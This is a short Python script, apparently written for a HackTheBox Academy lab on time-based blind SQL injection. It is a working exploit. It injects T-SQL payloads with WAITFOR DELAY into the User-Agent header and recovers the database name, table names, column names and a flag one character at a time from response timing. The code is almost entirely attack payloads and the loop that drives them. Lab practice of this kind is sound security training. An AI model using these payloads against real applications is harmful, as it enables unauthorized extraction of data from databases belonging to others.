#!/usr/bin/python3
# Created this script to solve the HackTheBox Academy lab called Time-based SQLi in the section called BLIND SQL INJECTION   

import requests
import time

def time_sqli():
    target="10.129.159.235"
    proxies= {"http":"http://127.0.0.1:8080"}
    count=0
    secret=""

    for num in range(1,40):
        if count == 95:
            break        
        for char in range(32,127):
            #headers={"User-Agent": f"test'if(Ascii(substring(db_name(),{num},1))={char}) WAITFOR DELAY '0:0:3'--"}               # Gets DB_name()
            headers={"User-Agent": f"test'if (ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_catalog='digcraft' ORDER BY table_name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY), {num}, 1)) = {char}) WAITFOR DELAY '0:0:3'--"}                  # Gets table names
            #headers={"User-Agent": f"test'if (ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='flag' and table_catalog='digcraft' ORDER BY table_name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY), {num}, 1)) = {char}) WAITFOR DELAY '0:0:3'--"}       # Gets column names
            #headers={"User-Agent": f"test'if (ASCII(SUBSTRING((SELECT flag FROM flag), {num}, 1)) = {char}) WAITFOR DELAY '0:0:3'--"}  # Dumps column data

            response= requests.get(url=f"http://{target}:8080", proxies=proxies, headers=headers, allow_redirects=True)
            if response.elapsed.total_seconds() > 2.90:
                print(chr(char))
                secret+=chr(char)
                count=0
                break
            else:
                count+=1
    print(f"Finished, this is the sensitive information dumped from the database: {secret}")

try:
    time_sqli()
except KeyboardInterrupt:
    print("ctrl +c detected, exiting gracefully")
